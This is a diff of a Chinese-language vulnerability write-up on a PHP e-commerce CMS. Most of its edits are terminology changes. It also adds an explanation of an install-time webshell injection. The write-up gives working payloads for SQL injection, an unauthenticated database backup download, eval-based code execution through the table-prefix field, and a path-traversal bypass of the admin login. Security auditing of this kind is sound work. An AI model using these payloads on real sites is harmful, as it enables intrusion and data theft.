@@ -80,16 +80,16 @@ default :
 ```
 看到了麼，限制了act也是有機可乘的。有一個注入存在。
 
-### **【Bug 0x15: SQL注入 獲取任意數據庫數據】**
+### **【Bug 0x15: SQL注入 獲取任意資料庫資料】**
 
 <pre>/admin.php?mod=ask&act=login&name=%' or 1=1%23</pre>
 
 **comment.php & order.php & product.php & user.php**
 
-### **【Bug 0x16: SQL注入 獲取任意數據庫數據】（同 【Bug 0x15】）**
+### **【Bug 0x16: SQL注入 獲取任意資料庫資料】（同 【Bug 0x15】）**
 
 ### **db.php**
-大致瀏覽、發現這是一個數據庫備份導入模塊，並且與其他模塊不同，沒有用到`switch`。
+大致瀏覽、發現這是一個資料庫備份導入模塊，並且與其他模塊不同，沒有用到`switch`。
 <p>
 
 只判斷了`$act == 'import'`導入功能，對於備份並沒有用act判斷。
@@ -153,7 +153,7 @@ if (isset($_p_pebackup))
     }
 }
 ```
-因此，我們可以直接備份數據庫，下載襲來。
+因此，我們可以直接備份資料庫，下載襲來。
 
 ```php
 if ($_p_backup_where == 'down') {
@@ -161,7 +161,7 @@ if ($_p_backup_where == 'down') {
 }
 ```
 
-### **【Bug 0x17: 完全數據庫信息洩漏】**
+### **【Bug 0x17: 完全資料庫信息洩漏】**
 POST:
 <p>
 <pre>/admin.php?mod=db&act=login</pre>
@@ -210,11 +210,11 @@ switch ($_g_step) {
         if (isset($_p_pesubmit)) 
         {
             $dbconn = mysql_connect("{$_p_db_host}:{$_p_db_port}", $_p_db_user, $_p_db_pw);
-            if (!$dbconn) pe_error('資料庫連接失敗...數據庫ip，用戶名，密碼對嗎？ ');
+            if (!$dbconn) pe_error('資料庫連接失敗...資料庫ip，用戶名，密碼對嗎？ ');
             if (!mysql_select_db($_p_db_name, $dbconn)) 
             {
                 mysql_query("CREATE DATABASE `{$_p_db_name}` DEFAULT CHARACTER SET utf8", $dbconn);
-                !mysql_select_db($_p_db_name, $dbconn) && pe_error('數據庫選擇失敗...數據庫名對嗎？');
+                !mysql_select_db($_p_db_name, $dbconn) && pe_error('資料庫選擇失敗...資料庫名對嗎？');
             }
             mysql_query("SET NAMES utf8", $dbconn);
             mysql_query("SET sql_mode = ''", $dbconn);
@@ -227,15 +227,40 @@ switch ($_g_step) {
             if ($result) 
             {
                 mysql_query("update `{$_p_dbpre}admin` set `admin_name` = '{$_p_admin_name}', `admin_pw` = '".md5($_p_admin_pw)."' where `admin_id`=1", $dbconn);
-               	 $config = $pe['db_host'] = '{$_p_db_host}' //數據庫主機地址
-			                $pe['db_name'] = '{$_p_db_name}'; //數據庫名稱
-			                $pe['db_user'] = '{$_p_db_user}'; //數據庫用戶名
-			                $pe['db_pw'] = '{$_p_db_pw}'; //數據庫密碼
+               	 $config = $pe['db_host'] = '{$_p_db_host}' //資料庫主機地址
+			                $pe['db_name'] = '{$_p_db_name}'; //資料庫名稱
+			                $pe['db_user'] = '{$_p_db_user}'; //資料庫用戶名
+			                $pe['db_pw'] = '{$_p_db_pw}'; //資料庫密碼
 			                $pe['db_coding'] = 'utf8';\n\
 			                $pe['url_model'] = 'pathinfo'; //url模式,可選項(pathinfo/pathinfo_safe/php)
-			                define('dbpre','{$_p_dbpre}'); //數據庫表前綴
+			                define('dbpre','{$_p_dbpre}'); //資料庫表前綴
                 
                 file_put_contents("{$pe['path_root']}config.php", $config);
                 pe_goto("{$pe['host_root']}install/index.php?step=success");
             }
 ```
+
+安裝的時候，傳輸的資料並沒有經過過濾。
+<p>
+導致可以直接寫webshell到config.php文件。
+<p>
+因為在寫配置之前，需要連接資料庫，我們能夠自由控制的變量只剩下表前綴{$_p_dbpre}了。
+<p>
+
+### **【Bug 0x19: 任意代碼執行】**
+<pre>
+/install/install.php?step=setting
+
+pesubmit=1&dbpre=');eval($_POST[1]);//&.....
+</pre>
+
+最後在總結一下我們所挖掘到的漏洞。
+<p>
+`index.php`和`admin.php`都能夠進行包含，我們是不是可以利用index.php包含admin的模塊？
+<p>
+答案是肯定的。這樣就成功繞過了`act=login`的限制了。
+<p>
+雖然會顯示模板錯誤，但是加載模板之前的代碼確確實實的執行了。
+
+### **【Bug 0x20: 越權】**
+<pre>/index.php?mod=../admin/setting（模塊）</pre>
